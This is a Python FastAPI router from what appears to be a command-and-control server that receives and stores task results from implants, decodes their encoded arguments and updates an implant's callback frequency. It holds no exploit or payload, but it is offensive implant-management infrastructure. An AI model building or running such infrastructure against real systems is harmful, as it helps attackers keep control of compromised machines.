import base64
import binascii
from datetime import datetime, timezone
from fastapi import APIRouter, FastAPI, HTTPException, status, Depends, Security
from fastapi.responses import RedirectResponse
from fastapi.security import OAuth2PasswordBearer
from jose import JWTError, jwt
from typing import Optional, List

# CORRECT imports when you're inside the 'server' package
from server_helper.user_helper import Users, UserRead, UserCreate, UserDelete
from server_helper.auth_helper import oauth2_scheme, verify_token
from server_helper.db import get_db, SessionLocal

from server_helper.implant_helper import Implant, ImplantCreate, ImplantRead
from server_helper.tasking_helper import (
    Tasking,
    TaskingCreate,
    TaskingRead,
    TaskingDelete,
)
from server_helper.results_helper import (
    Results,
    ResultsCreate,
    ResultsRead,
    ResultsDelete,
)

router = APIRouter(prefix="/results", tags=["results"])

# PROTECTED endpoint for clients to retrieve result based on session id and tasking id
@router.get("/{session}/{id}", response_model=ResultsRead)
def read_result(
    session: str,
    id: int,
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme),
):
    """
    Provide results of a tasking to the merchant client.
    :param session: The session id of the agent to retrieve tasking
    :param id: The id of the tasking that merchant wants results for
    :param db: The connection to the database
    :param token: The jwt authentication token used to auth to lighthouse
    :return db_result: The result of the tasking provided back in json format
    """
    verify_token(token)
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")
    db_result = (
        # this was a bad bug
        # db.query(Results).filter(Results.session == session, Results.id == id).first()
        db.query(Results)
        .filter(Results.session == session, Results.tasking_id == id)
        .first()
    )
    if db_result is None:
        raise HTTPException(status_code=416, detail="Result out of range")
    return db_result


# recieve tasking output from agent based on session id, marks task complete = True
@router.post("/{session}", response_model=ResultsCreate)
def create_results(
    session: str, results: ResultsCreate, db: SessionLocal = Depends(get_db)  # type: ignore
):
    """
    The endpoint where agents will send result output back to the lighthouse server
    :param session: The session id tied to the results being sent
    :param results: The results of the provided tasking
    :param db: The db connection to the sqlite database
    :return db_task: The successful tasking result or 404 if the session is not found
    or 400 if the results are not properly formatted
    """
    current_time = datetime.now(timezone.utc).isoformat()
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")
    if results.args:
        try:
            args_bytes = bytes.fromhex(results.args)
            decoded_args = base64.b64decode(args_bytes.decode("utf-8")).decode("utf-8")
        except (binascii.Error, UnicodeDecodeError, ValueError) as e:
            raise HTTPException(status_code=400, detail=f"Invalid encoded args: {e}")
    else:
        decoded_args = ""
    results_data = results.model_dump(exclude={"session", "date"})
    results_data["args"] = decoded_args

    if results_data["task"] == "reconfig":
        update_callback_freq(session, results_data, db)

    # you will need to decode the results eventually
    db_task = Results(**results_data, session=session, date=current_time)
    db.add(db_task)
    db.commit()
    db.refresh(db_task)
    # Mark the task as complete (break this out into its own function later)
    db_tasking = (
        db.query(Tasking)
        .filter(Tasking.session == session, Tasking.id == results.tasking_id)
        .first()
    )
    if db_tasking:
        db_tasking.complete = "True"
        db.commit()
        db.refresh(db_tasking)
    else:
        print("Task not found, cannot update completion status in the tasking table.")
        raise HTTPException(status_code=404, detail="Task not found")
    return db_task


def update_callback_freq(session: str, results_data: dict, db: SessionLocal = Depends(get_db)):  # type: ignore
    new_callback_freq = results_data["args"].split(" ")[0]
    implant = db.query(Implant).filter(Implant.session == session).first()
    if implant is not None and implant.alive:
        implant.callback_freq = new_callback_freq
        db.commit()
        db.refresh(implant)